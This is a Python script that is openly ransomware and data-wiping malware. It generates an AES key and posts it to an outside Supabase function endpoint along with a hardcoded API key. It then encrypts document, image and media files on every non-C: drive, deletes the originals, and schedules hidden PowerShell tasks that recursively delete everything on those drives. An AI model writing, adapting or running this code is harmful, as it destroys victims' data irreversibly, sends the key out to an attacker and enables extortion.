import os, string, subprocess, datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets
import tkinter as tk
from tkinter import messagebox
import secrets, string, requests


SUPABASE_URL = "https://siddmfkzxmdeienlbxnp.supabase.co"
ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpZGRtZmt6eG1kZWllbmxieG5wIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU3ODMwMzAsImV4cCI6MjA4MTM1OTAzMH0.Exvf-QPlTTpaLB7ext7Q8M4JqZ6l80i1uOCdpORit90"
FUNCTION_URL = f"{SUPABASE_URL}/functions/v1/save-user-pas"

DATA_EXTENSIONS = {
    ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
    ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".bmp",
    ".mp3", ".wav", ".mp4", ".avi",
    ".csv", ".json", ".xml"
}

def generate_aes256_key_hex():
    key = secrets.token_bytes(32)
    return key.hex() 

def generate_username(length=32):
    alphabet = string.ascii_uppercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))

def send_code_to_server(username: str, code: str):
    headers = {
        "apikey": ANON_KEY,
        "Authorization": f"Bearer {ANON_KEY}",
        "Content-Type": "application/json",
    }
    payload = {"user_name": username, "client_code": code}

    r = requests.post(FUNCTION_URL, headers=headers, json=payload, timeout=15)

    print("HTTP:", r.status_code)
    print("RESP:", r.text[:2000])

    r.raise_for_status()
    return r.json()

def schedule_drive_wipe(drives, minutes=2):
    run_time = (datetime.datetime.now() + datetime.timedelta(minutes=minutes)).strftime("%H:%M")
    for drive in drives:
        command = (
            f'schtasks /create /tn "Wipe_{drive[0]}" '
            f'/tr "powershell -NoProfile -WindowStyle Hidden -Command \\"Remove-Item \'{drive}\\*\' -Recurse -Force\\"" '
            f'/sc once /st {run_time} /f'
        )
        subprocess.run(command, shell=True)

def main():
    code = generate_aes256_key_hex()
    username = generate_username()
    print(send_code_to_server(username, code))

    backend = default_backend()
    block = algorithms.AES(code)

    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    target_drives = []

    for drive in drives:
        if drive == "C:\\": 
            continue
        target_drives.append(drive)
        for root, dirs, files in os.walk(drive):
            for file_name in files:
                if file_name.endswith(".enc"):
                    continue

                ext = os.path.splitext(file_name)[1].lower()
                if ext not in DATA_EXTENSIONS:
                    continue

                path = os.path.join(root, file_name)
                print(f"Encrypting {path}...")
                try:
                    with open(path, 'rb') as f:
                        original = f.read()
                    nonce = secrets.token_bytes(12)
                    gcm = modes.GCM(nonce)
                    cipher = Cipher(block, gcm, backend=backend)
                    encryptor = cipher.encryptor()
                    encrypted = encryptor.update(original) + encryptor.finalize()
                    tag = encryptor.tag
                    full_encrypted = nonce + encrypted + tag
                    with open(path + ".enc", 'wb') as f:
                        f.write(full_encrypted)
                    os.remove(path)
                except Exception as e:
                    if "read" in str(e).lower():
                        print("error while reading file contents")
                    elif "write" in str(e).lower():
                        print("error while writing contents")
                    else:
                        print(f"Error: {e}")

    if target_drives:
        schedule_drive_wipe(target_drives)

if __name__ == "__main__":
    main()